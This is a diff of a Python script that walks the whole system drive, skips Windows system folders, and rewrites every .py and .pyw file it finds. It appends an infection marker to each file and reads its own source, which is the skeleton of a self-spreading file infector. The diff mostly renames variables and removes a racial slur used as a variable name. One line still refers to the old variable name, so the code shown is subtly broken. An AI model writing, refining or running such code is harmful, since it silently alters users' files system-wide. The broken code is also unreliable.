@@ -11,7 +11,6 @@ from os.path import expanduser
 start_time = time.time()
 xpressDict = {}
 whoCares = []
-rlzNigga = []
 trash = 'abcdefghijklmnopqrstuvwxyz'
 lengh = random.randrange(10, 20)
 _CURPYDIR = os.path.basename(os.path.normpath((sys.exec_prefix)))
@@ -33,15 +32,12 @@ elif platform == "win32":
     _WINDIR = "Windows"
     _OSDIR = os.environ['SYSTEMDRIVE'] + '\\'
     _RBIN = "$Recycle.Bin"
-    rlzNigga.append(_WINDIR)
-    rlzNigga.append(_RBIN)
     xpressDict = {_WINDIR, _RBIN, _CURPYDIR}
     jetojedno = False
 
 if not jetojedno:
     for i, value in enumerate(xpressDict):
         whoCares.append(value)
-    shit = 0
     fajly = {}
     adin = 0
     subdirnameP = ""
@@ -56,9 +52,9 @@ if not jetojedno:
         val = ""
         for file in files:
             if adin == 0:
-                fck = glob.glob(subdir + '\\*.py') + glob.glob(subdir + '\\*.pyw')
+                pyfiles = glob.glob(subdir + '\\*.py') + glob.glob(subdir + '\\*.pyw')
                 adin = adin + 1
-                for fck in fck:
+                for pyfile in pyfiles:
                     pyborNR = pyborNR + 1
                     hostS = open(fck, 'r', errors='ignore')
                     hdrrr = []
@@ -72,20 +68,18 @@ if not jetojedno:
                         encdngTx = _SYSENC
                     hostS.close()
                     try:
-                        f = open(fck, 'r', encoding=encdngTx, errors='ignore')
+                        f = open(pyfile, 'r', encoding=encdngTx, errors='ignore')
                     except:
-                        print('VPICI')
                         encdngTx = "utf-8"
                         continue
-                    hostS = open(fck, 'r', encoding=encdngTx, errors='ignore')
+                    hostS = open(pyfile, 'r', encoding=encdngTx, errors='ignore')
                     hostcodeS = hostS.read()
-                    if not os.stat(fck).st_size == 0:
+                    if not os.stat(pyfile).st_size == 0:
                         if hostcodeS.find("---*dffff*---") == -1:
                             myself = open(__file__, 'r')
                             mybody = hostcodeS + chr(10) + "#byltu ---*dffff*---"
                             try:
-                                with open(fck, 'w', encoding=encdngTx, errors='ignore') as fin:
-                                    shit = shit + 1
+                                with open(pyfile, 'w', encoding=encdngTx, errors='ignore') as fin:
                                     fin.write(mybody)
                                     fin.close()
                             except IOError:
@@ -97,6 +91,5 @@ if not jetojedno:
                     adin = 0
                     break
 
-    print(str(shit))
     print(fajly)
     print("--- %s seconds ---" % (time.time() - start_time))
